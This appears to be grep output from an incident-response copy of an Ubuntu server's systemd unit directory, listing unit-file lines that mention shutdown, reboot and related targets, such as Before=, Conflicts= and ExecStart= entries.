+/root/ir-resume-2026-04-18-155542/system/multipath-tools.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-155542/system/multipath-tools.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/lvm2-lvmpolld.service:5:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/lvm2-lvmpolld.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-modules-load.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-modules-load.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-sysusers.service:22:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-sysusers.service:23:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-modules-load.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-modules-load.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/multipathd.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/multipathd.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-binfmt.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-binfmt.service:20:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-hwdb-update.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-hwdb-update.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/open-iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/open-iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-journal-catalog-update.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-journal-catalog-update.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-firstboot.service:28:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-firstboot.service:29:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/proc-sys-fs-binfmt_misc.automount:20:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/proc-sys-fs-binfmt_misc.automount:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/finalrd.service:4:Description=Create final runtime dir for shutdown pivot root
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/finalrd.service:8:Conflicts=shutdown.target umount.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/finalrd.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup-dev-early.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup-dev-early.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pstore.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pstore.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pcrphase-sysinit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pcrphase-sysinit.service:16:Before=basic.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-done.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-done.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-random-seed.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-random-seed.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tpm2-setup.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tpm2-setup.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/lvm2-lvmpolld.socket:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-sysctl.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-sysctl.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/blk-availability.service:3:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/blk-availability.service:4:After=iscsi-shutdown.service iscsi.service iscsid.service fcoe.service rbdmap.service
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/blk-availability.service:6:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/lvm2-monitor.service:6:Before=local-fs-pre.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/lvm2-monitor.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pcrmachine.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pcrmachine.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-repart.service:26:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-repart.service:27:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/ldconfig.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/ldconfig.service:21:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-pcrphase.service:22:ExecStop=/usr/lib/systemd/systemd-pcrextend --graceful shutdown
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-utmp.service:11:Description=Record System Boot/Shutdown in UTMP
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-utmp.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-utmp.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-utmp.service:25:ExecStart=/usr/lib/systemd/systemd-update-utmp reboot
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-update-utmp.service:26:ExecStop=/usr/lib/systemd/systemd-update-utmp shutdown
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-machine-id-commit.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-machine-id-commit.service:15:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service:18:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service:19:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-timesyncd.service:17:Before=time-set.target sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-timesyncd.service:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tpm2-setup-early.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-tpm2-setup-early.service:15:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-ask-password-console.path:21:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-ask-password-console.path:22:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-resolved.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-resolved.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-journald.service:18:# To avoid journald SIGKILLed during soft-reboot and corrupting journals.
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-journald.service:20:Before=soft-reboot.target
+/root/ir-resume-2026-04-18-155542/system/sysinit.target.wants/systemd-journald.service:21:Conflicts=soft-reboot.target
+/root/ir-resume-2026-04-18-155542/system/redis.service:9:ExecStop=/usr/local/bin/redis-cli shutdown
+/root/ir-resume-2026-04-18-155542/system/cloud-init.target.wants/cloud-init-local.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/cloud-init.target.wants/cloud-init-local.service:11:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/cloud-init.target.wants/cloud-init.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/cloud-init.target.wants/cloud-init.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-sysext@.service:15:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-sysext@.service:16:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/multipathd.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/root/ir-resume-2026-04-18-155542/system/multipathd.service:10:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-ask-password-wall.path:18:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-ask-password-wall.path:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-fsck@.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-fsck@.service:18:Before=systemd-quotacheck.service shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-binfmt.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-binfmt.service:20:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-file-system.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-file-system.service:15:Before=sysinit.target shutdown.target systemd-pcrlock-make-policy.service
+/root/ir-resume-2026-04-18-155542/system/pam_namespace.service:3:Before=multi-user.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/pam_namespace.service:4:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/initrd-root-device.target.wants/remote-cryptsetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/initrd-root-device.target.wants/remote-veritysetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/shutdown.target:11:Description=System Shutdown
+/root/ir-resume-2026-04-18-155542/system/iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-hwdb-update.service:22:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-hwdb-update.service:23:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/dbus.service:5:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-155542/system/friendly-recovery.service:4:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/kexec.target:11:Description=Reboot via kexec
+/root/ir-resume-2026-04-18-155542/system/remote-fs.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/open-iscsi.service:8:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/open-iscsi.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sockets.target.wants/dbus.socket:3:# Do not stop on shutdown
+/root/ir-resume-2026-04-18-155542/system/sockets.target.wants/systemd-networkd.socket:15:Before=sockets.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/sockets.target.wants/systemd-networkd.socket:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-exit.service:14:Requires=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-155542/system/systemd-exit.service:15:After=shutdown.target umount.target final.target
+/root/ir-resume-2026-04-18-155542/system/systemd-network-generator.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-network-generator.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrfs-root.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrfs-root.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/securebootmgr.service:2:Description=Service Unit File - securebootmgr.service
+/root/ir-resume-2026-04-18-155542/system/systemd-journal-catalog-update.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-journal-catalog-update.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/initrd-root-fs.target.wants/systemd-repart.service:26:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/initrd-root-fs.target.wants/systemd-repart.service:27:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-firstboot.service:28:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-firstboot.service:29:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-remount-fs.service:19:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-remount-fs.service:20:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/proc-sys-fs-binfmt_misc.automount:20:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/proc-sys-fs-binfmt_misc.automount:21:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd.service:18:Before=network.target multi-user.target shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd.service:19:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/quotaon.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-sysupdate-reboot.service:11:Description=Reboot Automatically After System Update
+/root/ir-resume-2026-04-18-155542/system/systemd-sysupdate-reboot.service:12:Documentation=man:systemd-sysupdate-reboot.service(8)
+/root/ir-resume-2026-04-18-155542/system/systemd-sysupdate-reboot.service:17:ExecStart=/usr/lib/systemd/systemd-sysupdate reboot
+/root/ir-resume-2026-04-18-155542/system/systemd-sysupdate-reboot.service:20:Also=systemd-sysupdate-reboot.timer
+/root/ir-resume-2026-04-18-155542/system/finalrd.service:4:Description=Create final runtime dir for shutdown pivot root
+/root/ir-resume-2026-04-18-155542/system/finalrd.service:8:Conflicts=shutdown.target umount.target
+/root/ir-resume-2026-04-18-155542/system/finalrd.service:9:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-make-policy.service:14:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrlock-make-policy.service:16:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-tmpfiles-clean.service:16:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-tmpfiles-clean.service:17:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/plymouth-poweroff.service:4:Before=systemd-poweroff.service
+/root/ir-resume-2026-04-18-155542/system/plymouth-poweroff.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-155542/system/plymouth-switch-root-initramfs.service:4:# dracut-shutdown.service restores the initramfs when it is _stopped_
+/root/ir-resume-2026-04-18-155542/system/plymouth-switch-root-initramfs.service:6:Conflicts=dracut-shutdown.service
+/root/ir-resume-2026-04-18-155542/system/plymouth-switch-root-initramfs.service:7:After=plymouth-halt.service plymouth-reboot.service plymouth-poweroff.service plymouth-kexec.service dracut-shutdown.service mkinitcpio-generate-shutdown-ramfs.service
+/root/ir-resume-2026-04-18-155542/system/plymouth-switch-root-initramfs.service:9:ConditionPathExists=|/run/initramfs/shutdown
+/root/ir-resume-2026-04-18-155542/system/nginx.service:6:# and sends SIGTERM (fast shutdown) to the main process.
+/root/ir-resume-2026-04-18-155542/system/reboot.target:11:Description=System Reboot
+/root/ir-resume-2026-04-18-155542/system/reboot.target:14:Requires=systemd-reboot.service
+/root/ir-resume-2026-04-18-155542/system/reboot.target:15:After=systemd-reboot.service
+/root/ir-resume-2026-04-18-155542/system/reboot.target:18:JobTimeoutAction=reboot-force
+/root/ir-resume-2026-04-18-155542/system/systemd-rfkill.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-rfkill.service:19:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-growfs-root.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-growfs-root.service:17:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-ask-password-plymouth.service:5:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-ask-password-plymouth.service:7:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/initrd.target.wants/systemd-pcrphase-initrd.service:14:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/initrd.target.wants/systemd-pcrphase-initrd.service:15:Before=sysinit.target cryptsetup-pre.target cryptsetup.target shutdown.target initrd-switch-root.target systemd-sysext.service
+/root/ir-resume-2026-04-18-155542/system/initrd.target.wants/systemd-battery-check.service:25:FailureAction=poweroff-force
+/root/ir-resume-2026-04-18-155542/system/initrd.target.wants/systemd-bsod.service:16:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/initrd.target.wants/systemd-bsod.service:17:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/ctrl-alt-del.target:11:Description=System Reboot
+/root/ir-resume-2026-04-18-155542/system/ctrl-alt-del.target:14:Requires=systemd-reboot.service
+/root/ir-resume-2026-04-18-155542/system/ctrl-alt-del.target:15:After=systemd-reboot.service
+/root/ir-resume-2026-04-18-155542/system/ctrl-alt-del.target:18:JobTimeoutAction=reboot-force
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrfs@.service:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrfs@.service:17:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-tmpfiles-setup-dev-early.service:17:Conflicts=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-tmpfiles-setup-dev-early.service:18:Before=shutdown.target initrd-switch-root.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pstore.service:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pstore.service:17:Before=sysinit.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/ua-reboot-cmds.service:2:# is required immediately after the next reboot.
+/root/ir-resume-2026-04-18-155542/system/ua-reboot-cmds.service:9:Description=Ubuntu Pro reboot cmds
+/root/ir-resume-2026-04-18-155542/system/ua-reboot-cmds.service:10:ConditionPathExists=|/var/lib/ubuntu-advantage/marker-reboot-cmds-required
+/root/ir-resume-2026-04-18-155542/system/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/root/ir-resume-2026-04-18-155542/system/systemd-fsckd.service:13:Before=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd.socket:15:Before=sockets.target shutdown.target
+/root/ir-resume-2026-04-18-155542/system/systemd-networkd.socket:16:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/final.target.wants/snapd.system-shutdown.service:2:Description=Ubuntu core (all-snaps) system shutdown helper setup service
+/root/ir-resume-2026-04-18-155542/system/final.target.wants/snapd.system-shutdown.service:9:# don't run if system-shutdown isn't there
+/root/ir-resume-2026-04-18-155542/system/final.target.wants/snapd.system-shutdown.service:10:ConditionPathExists=/usr/lib/snapd/system-shutdown
+/root/ir-resume-2026-04-18-155542/system/final.target.wants/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/root/ir-resume-2026-04-18-155542/system/remote-cryptsetup.target:15:Conflicts=shutdown.target
+/root/ir-resume-2026-04-18-155542/system/snapd.system-shutdown.service:2:Description=Ubuntu core (all-snaps) system shutdown helper setup service
+/root/ir-resume-2026-04-18-155542/system/snapd.system-shutdown.service:9:# don't run if system-shutdown isn't there
+/root/ir-resume-2026-04-18-155542/system/snapd.system-shutdown.service:10:ConditionPathExists=/usr/lib/snapd/system-shutdown
+/root/ir-resume-2026-04-18-155542/system/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/root/ir-resume-2026-04-18-155542/system/plymouth-kexec.service:2:Description=Show Plymouth Reboot with kexec Screen
+/root/ir-resume-2026-04-18-155542/system/plymouth-kexec.service:12:ExecStart=/usr/sbin/plymouthd --mode=shutdown --attach-to-session
+/root/ir-resume-2026-04-18-155542/system/systemd-journald@.service:16:# To avoid journald SIGKILLed during soft-reboot and corrupting journals.
+/root/ir-resume-2026-04-18-155542/system/systemd-journald@.service:18:Before=soft-reboot.target
+/root/ir-resume-2026-04-18-155542/system/systemd-journald@.service:19:Conflicts=soft-reboot.target
+/root/ir-resume-2026-04-18-155542/system/systemd-pcrphase-sysinit.service:14:Conflicts=shutdown.target
